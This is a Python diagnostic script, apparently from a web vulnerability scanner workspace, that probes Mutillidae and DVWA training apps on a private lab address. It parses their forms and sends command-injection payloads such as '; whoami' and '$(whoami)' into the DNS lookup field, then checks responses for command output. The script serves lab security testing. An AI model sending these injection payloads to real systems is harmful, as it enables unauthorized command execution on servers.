"""Deep Mutillidae + DVWA 诊断"""
import sys, asyncio, aiohttp, re
sys.path.insert(0, r"C:\Users\HZR\.qclaw\workspace-agent-b7ed571b\wvs-v18")

TARGET = "http://192.168.18.131"

async def check():
    async with aiohttp.ClientSession() as session:

        # === Mutillidae: 检查完整表单和页面参数 ===
        print("=" * 60)
        print("[1] Mutillidae DNS Lookup - Full Form Analysis")
        print("=" * 60)

        # Get the dns-lookup page to see full form
        url = f"{TARGET}/mutillidae/index.php?page=dns-lookup.php"
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            html = await resp.text()
            print(f"GET page: {resp.status}, len={len(html)}")

            # Find all forms
            forms = re.findall(r'<form(.*?)</form>', html, re.DOTALL | re.IGNORECASE)
            print(f"Forms found: {len(forms)}")
            for i, form in enumerate(forms):
                action = re.search(r'action=[\"\'](.*?)[\"\']', form)
                method = re.search(r'method=[\"\'](.*?)[\"\']', form, re.IGNORECASE)
                inputs = re.findall(r'<input[^>]*name=[\"\'](.*?)[\"\'](.*?)/?>', form, re.DOTALL)
                hiddens = re.findall(r'<input[^>]*type=[\"\'](hidden)[\"\'](.*?)>', form, re.DOTALL)
                print(f"  Form {i}: action={action.group(1) if action else 'none'}, method={method.group(1) if method else 'GET'}")
                print(f"    Inputs: {[x[0] for x in inputs]}")
                for h in hiddens:
                    name_m = re.search(r'name=[\"\'](.*?)[\"\']', h)
                    val_m = re.search(r'value=[\"\'](.*?)[\"\']', h)
                    if name_m:
                        print(f"    Hidden: {name_m.group(1)} = {val_m.group(1) if val_m else ''}")

        # Try POST with page parameter
        print("\nTrying POST with page=dns-lookup.php...")
        data = {
            "page": "dns-lookup.php",
            "target_host": "; whoami",
            "dns-lookup-php-submit-button": "Lookup"
        }
        async with session.post(f"{TARGET}/mutillidae/index.php", data=data, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            html2 = await resp.text()
            print(f"POST with page: {resp.status}, len={len(html2)}")
            for kw in ["www-data", "daemon", "root:", "uid=", "nobody", "apache"]:
                if kw in html2:
                    idx = html2.index(kw)
                    print(f"  -> CMD OUTPUT: '{kw}': ...{html2[max(0,idx-30):idx+50]}...")

        # Try a simpler approach: just target_host in GET
        print("\nTrying GET with target_host param...")
        async with session.get(f"{TARGET}/mutillidae/index.php?page=dns-lookup.php&target_host=;whoami", timeout=aiohttp.ClientTimeout(total=10)) as resp:
            html3 = await resp.text()
            print(f"GET with target_host: {resp.status}, len={len(html3)}")
            for kw in ["www-data", "daemon", "root:", "uid=", "nobody"]:
                if kw in html3:
                    idx = html3.index(kw)
                    print(f"  -> CMD OUTPUT: '{kw}': ...{html3[max(0,idx-30):idx+50]}...")

        # Try with different separator payloads
        print("\nTrying different CMDi payloads...")
        for payload in ["| whoami", "`whoami`", "$(whoami)", "&& whoami", "\n whoami"]:
            try:
                async with session.get(f"{TARGET}/mutillidae/index.php?page=dns-lookup.php&target_host={payload}", timeout=aiohttp.ClientTimeout(total=10)) as resp:
                    text = await resp.text()
                    for kw in ["www-data", "daemon", "root:", "nobody", "apache"]:
                        if kw in text:
                            print(f"  [{payload}] FOUND: {kw}")
                            break
                    else:
                        pass  # silent
            except:
                pass
        print("  (no command output detected for any payload)")

        # === DVWA: 检查是否真的在线 ===
        print("\n" + "=" * 60)
        print("[2] DVWA Status Check")
        print("=" * 60)

        # Try main page
        async with session.get(f"{TARGET}/dvwa/", timeout=aiohttp.ClientTimeout(total=10), allow_redirects=False) as resp:
            print(f"DVWA root: {resp.status}")
            if resp.status == 302:
                print(f"  Redirect to: {resp.headers.get('Location', '?')}")

        # Try login with full headers
        headers = {"Referer": f"{TARGET}/dvwa/login.php"}
        async with session.get(f"{TARGET}/dvwa/login.php", headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as resp:
            text = await resp.text()
            print(f"Login page: {resp.status}, len={len(text)}")
            # Look for form
            form_match = re.search(r'<form(.*?)</form>', text, re.DOTALL | re.IGNORECASE)
            if form_match:
                form_html = form_match.group(1)
                print(f"Form found: {len(form_html)} chars")
                inputs = re.findall(r'name=[\"\'](.*?)[\"\'](.*?)>', form_html, re.DOTALL)
                for name, rest in inputs:
                    val_m = re.search(r'value=[\"\'](.*?)[\"\']', rest)
                    type_m = re.search(r'type=[\"\'](.*?)[\"\']', rest)
                    print(f"  {name} = {val_m.group(1) if val_m else ''} (type={type_m.group(1) if type_m else '?'})")
            else:
                print(f"No form found! Page may be broken.")
                print(f"Content: {text[:500]}")

asyncio.run(check())
